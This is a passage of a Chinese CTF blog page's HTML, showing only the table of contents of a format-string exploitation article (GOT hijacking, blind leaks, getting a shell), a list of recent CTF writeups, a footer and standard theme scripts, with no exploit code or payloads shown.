href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-1"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%B8%E5%85%B3%E5%9C%B0%E5%9D%80%E4%B8%8E%E5%81%8F%E7%A7%BB"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">获取相关地址与偏移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E8%81%94%E7%B3%BB%E4%BA%BA%E8%8E%B7%E5%8F%96%E5%A0%86%E5%9C%B0%E5%9D%80"><span class="toc-number">1.4.2.5.</span> <span class="toc-text">构造联系人获取堆地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9-ebp"><span class="toc-number">1.4.2.6.</span> <span class="toc-text">修改 ebp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="toc-number">1.4.2.7.</span> <span class="toc-text">获取 shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F-2"><span class="toc-number">1.4.2.8.</span> <span class="toc-text">利用程序</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93"><span class="toc-number">1.5.</span> <span class="toc-text">格式化字符串盲打</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-number">1.5.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-1-%E6%B3%84%E9%9C%B2%E6%A0%88"><span class="toc-number">1.5.2.</span> <span class="toc-text">例子 1 - 泄露栈</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E7%A8%8B%E5%BA%8F%E4%BD%8D%E6%95%B0"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">确定程序位数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-2-%E7%9B%B2%E6%89%93%E5%8A%AB%E6%8C%81-got"><span class="toc-number">1.5.3.</span> <span class="toc-text">例子 2 - 盲打劫持 got</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E7%A8%8B%E5%BA%8F%E4%BD%8D%E6%95%B0-1"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">确定程序位数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB-1"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">确定偏移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-binary"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">泄露 binary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-binary"><span class="toc-number">1.5.3.4.</span> <span class="toc-text">分析 binary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-2"><span class="toc-number">1.5.3.5.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F-3"><span class="toc-number">1.5.3.6.</span> <span class="toc-text">利用程序</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.5.4.</span> <span class="toc-text">题目</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/archives/feaa0d63/" title="2021 强网杯 Writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 强网杯 Writeup"/></a><div class="content"><a class="title" href="/archives/feaa0d63/" title="2021 强网杯 Writeup">2021 强网杯 Writeup</a><time datetime="2021-10-28T15:33:05.628Z" title="更新于 2021-10-28 23:33:05">2021-10-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/dd6b8a05/" title="2021 强网拟态 Writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 强网拟态 Writeup"/></a><div class="content"><a class="title" href="/archives/dd6b8a05/" title="2021 强网拟态 Writeup">2021 强网拟态 Writeup</a><time datetime="2021-10-26T16:33:45.953Z" title="更新于 2021-10-27 00:33:45">2021-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/5a8ecb34/" title="2021 长安杯决赛 Writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 长安杯决赛 Writeup"/></a><div class="content"><a class="title" href="/archives/5a8ecb34/" title="2021 长安杯决赛 Writeup">2021 长安杯决赛 Writeup</a><time datetime="2021-10-26T16:33:29.201Z" title="更新于 2021-10-27 00:33:29">2021-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/1864d911/" title="去除花指令总结"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="去除花指令总结"/></a><div class="content"><a class="title" href="/archives/1864d911/" title="去除花指令总结">去除花指令总结</a><time datetime="2021-10-21T14:39:35.793Z" title="更新于 2021-10-21 22:39:35">2021-10-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/0/" title="无题"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/archives/0/" title="无题">无题</a><time datetime="2021-10-17T02:32:49.387Z" title="更新于 2021-10-17 10:32:49">2021-10-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/default_cover2.png')"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By SkYe231</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a href="https://cloud.tencent.com/product/wh?from=12331" target="_blank">Hosted BY 云开发 Cloudbase</a>&nbsp;|&nbsp;<a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-07-01-lGwrnPz3GuV4odmM.png" align="top" style="width:48px"></a><br /><div class="github-badge"><a rel="license" href="http://beian.miit.gov.cn/" target="_blank" title="粤ICP备20056619号"><span class="badge-subject">粤ICP备</span><span class="badge-value bg-black">20056619号</span></a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (document.getElementsByClassName('mermaid').length) {
  if (window.mermaidJsLoad) mermaid.init()
  else {
    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
      window.mermaidJsLoad = true
      mermaid.initialize({
        theme: 'default',
      })
      false && mermaid.init()
    })
  }
}</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>